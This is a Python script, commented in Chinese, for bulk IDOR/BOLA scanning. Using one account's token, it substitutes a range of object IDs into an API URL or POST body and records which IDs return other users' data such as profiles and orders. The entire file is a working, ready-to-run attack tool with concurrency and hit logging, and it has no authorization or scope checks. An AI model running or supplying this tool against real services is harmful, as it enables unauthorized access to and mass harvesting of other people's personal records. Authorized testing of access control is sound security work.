#!/usr/bin/env python3
"""
IDOR / BOLA 批量扫描器 — 用账号 A 的 Token 请求 ID 范围, 找出能访问的 ID。

用法:
    python idor_sweep.py -u "https://target.com/api/users/{ID}/profile" \
        --token "Bearer xxx" --range 1-10000 --out idor_found.txt

    # POST body 注入
    python idor_sweep.py -u "https://target.com/api/orders" \
        --method POST --body '{"orderId": {ID}}' --token "xxx" \
        --range 1-5000 --marker "current_user_id"

核心: ID 替换 + 对比响应, 识别越权。
"""
import argparse
import concurrent.futures
import json
import re
import sys
from urllib.parse import urlparse
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError


def parse_range(s: str) -> list:
    """支持: '1-100' / '1,5,10' / '1-100,200,300-400'"""
    out = []
    for part in s.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-")
            out.extend(range(int(a), int(b) + 1))
        else:
            out.append(int(part))
    return out


def request_one(url_tpl: str, body_tpl: str, method: str, headers: dict,
                idx: int, id_marker: str = "{ID}", timeout: int = 10):
    url = url_tpl.replace(id_marker, str(idx))
    body = None
    if body_tpl:
        body = body_tpl.replace(id_marker, str(idx)).encode("utf-8")
    req = Request(url, data=body, method=method.upper())
    for k, v in headers.items():
        req.add_header(k, v)
    try:
        with urlopen(req, timeout=timeout) as resp:
            text = resp.read(8192).decode("utf-8", errors="ignore")
            return idx, resp.status, text
    except HTTPError as e:
        body_text = ""
        try:
            body_text = e.read(1024).decode("utf-8", errors="ignore")
        except Exception:
            pass
        return idx, e.code, body_text
    except URLError as e:
        return idx, 0, str(e)


def main():
    ap = argparse.ArgumentParser(description="IDOR / BOLA bulk sweeper.")
    ap.add_argument("-u", "--url", required=True,
                    help='URL template with {ID}. e.g. https://t.com/api/users/{ID}')
    ap.add_argument("--method", default="GET", choices=["GET", "POST", "PUT", "DELETE", "PATCH"])
    ap.add_argument("--body", help="Body template (e.g. '{\"id\":{ID}}'). Uses {ID} as placeholder.")
    ap.add_argument("--token", help='Authorization header value (e.g. "Bearer xxx").')
    ap.add_argument("--header", action="append", default=[],
                    help='Extra headers as "Key: Value". Can be repeated.')
    ap.add_argument("--range", required=True, help="ID range: '1-1000' or '1,5,9' or mix.")
    ap.add_argument("--concurrency", type=int, default=10)
    ap.add_argument("--marker", help='Success marker string in response (e.g. "email"). Empty = match any 200.')
    ap.add_argument("--not-marker", help='Negative marker: skip if response contains this.')
    ap.add_argument("--out", help="Save successful IDs to file.")
    ap.add_argument("--min-length", type=int, default=0, help="Min response length (to skip empty).")
    ap.add_argument("--timeout", type=int, default=10)
    args = ap.parse_args()

    headers = {"User-Agent": "Mozilla/5.0 (IDOR-Sweeper)"}
    if args.token:
        if not args.token.lower().startswith("bearer ") and "=" not in args.token:
            args.token = "Bearer " + args.token
        headers["Authorization"] = args.token
    if args.method in ("POST", "PUT", "PATCH") and args.body:
        headers.setdefault("Content-Type", "application/json")
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    ids = parse_range(args.range)
    print(f"[*] Target: {args.url}")
    print(f"[*] IDs to test: {len(ids)}")
    print(f"[*] Headers: {headers}")

    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as ex:
        futures = {
            ex.submit(request_one, args.url, args.body, args.method, headers, i, "{ID}", args.timeout): i
            for i in ids
        }
        for fut in concurrent.futures.as_completed(futures):
            idx, status, text = fut.result()
            length = len(text)
            if status != 200:
                continue
            if length < args.min_length:
                continue
            if args.marker and args.marker not in text:
                continue
            if args.not_marker and args.not_marker in text:
                continue
            print(f"[+] ID={idx}  status={status}  len={length}  preview={text[:80]!r}")
            found.append(idx)

    print(f"\n[summary] hit={len(found)}/{len(ids)}")
    if args.out and found:
        with open(args.out, "w") as f:
            for i in sorted(found):
                f.write(f"{i}\n")
        print(f"[*] Saved to {args.out}")


if __name__ == "__main__":
    main()
